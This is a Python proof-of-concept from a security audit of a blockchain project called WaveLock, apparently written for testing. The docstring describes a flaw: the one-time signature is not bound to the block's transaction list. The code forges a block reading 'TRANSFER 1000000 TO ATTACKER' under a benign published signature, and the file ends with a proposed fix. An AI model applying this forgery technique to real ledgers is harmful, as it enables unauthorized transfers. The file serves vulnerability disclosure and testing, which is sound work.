"""
ots_block_body_unbound.py — the WaveLock-OTS signature does NOT bind the block body.

Finding M1 (attacks/WAVELOCK_MYTHOS_BREAK_REPORT.md).

Thesis of the break
-------------------
An OTS-authenticated block carries its authentication material in
``meta.ots_auth = {public_key, message, signature}`` (see
``server.build_ots_block_meta``). ``server._verify_ots_block`` verifies the
signature against ``meta.ots_auth.message`` ONLY. Nothing ties that signed
``message`` to the block's actual payload — ``Block.messages`` — which is what
the rest of the chain treats as the block's transactions (cf. the legacy
curvature path, which parses ``b.messages`` for ``message:/signature:/commitment:``).

``Block.calculate_hash`` commits to ``merkle_root`` (derived from ``messages``)
and to ``meta``, so the block *hash* covers both. But the OTS *signature* is just
an opaque field inside ``meta``; it authenticates an attacker-chosen string that
need not equal — or even relate to — ``b.messages``.

Consequences
------------
1. A signer who publishes a benign OTS signature (a CLI demo artifact, a
   "proof of key control" sample, an off-chain receipt) has, in effect, signed a
   blank cheque: anyone holding that public (message, signature) pair can mint a
   first-acceptance OTS block whose ``messages`` payload is arbitrary. The
   signature authorized "hello world"; the accepted block says
   "TRANSFER 1000000 TO ATTACKER".
2. Even self-signed, the OTS auth provides ZERO integrity over the block's
   transaction list. The "authenticated" block is authenticated in name only.

Threat model: attacker has a victim's public key and ONE published, *unspent*
WaveLock-OTS signature over any message (both are explicitly in scope). No seed,
no ψ★, no secret slice, no key reuse.

This SUCCEEDS today. The fix is to bind ``b.messages`` (and the rest of the
block identity) into the signed message, e.g. sign ``H(canonical_block_body)``
and have ``_verify_ots_block`` recompute it, rejecting any block whose body does
not match the signed digest.
"""

from __future__ import annotations

import tempfile
import os

from wavelock.chain.Block import Block
from wavelock.crypto.ots_ledger import PersistentOTSReplayLedger
from wavelock.crypto.wavelock_ots import generate_ots_keypair, sign_ots, verify_ots
from wavelock.network import server


def block_body_is_unbound() -> bool:
    """Return True if an OTS block whose body != signed message is accepted."""
    tmp = tempfile.mkdtemp()
    led = PersistentOTSReplayLedger(path=os.path.join(tmp, "ots_replay.jsonl"))

    # Victim signs a benign message and publishes the signature (never spends it).
    kp = generate_ots_keypair(entropy_bits=256)
    pub, sec = kp["public_key"], kp["secret_key"]
    benign_sig = sign_ots(sec, "hello world")
    assert verify_ots(pub, "hello world", benign_sig) is True

    # Attacker mints an OTS block: body says one thing, signed message another.
    meta = server.build_ots_block_meta(pub, "hello world", benign_sig)
    evil_block = Block(
        index=1,
        messages=["TRANSFER 1000000 TO ATTACKER", "pay mallory everything"],
        previous_hash="0" * 64,
        difficulty=1,
        block_type="OTS",
        meta=meta,
    )
    return bool(server._verify_ots_block(evil_block, None, ledger=led))


if __name__ == "__main__":
    accepted = block_body_is_unbound()
    print(f"[M1] OTS block with unauthenticated body accepted: {accepted}")
    if accepted:
        print("  (BREAK — the OTS signature binds only meta.ots_auth.message, "
              "NOT Block.messages. Block authentication is decorative w.r.t. "
              "the block's transaction payload.)")
    else:
        print("  (defended — the signed message is bound to the block body.)")
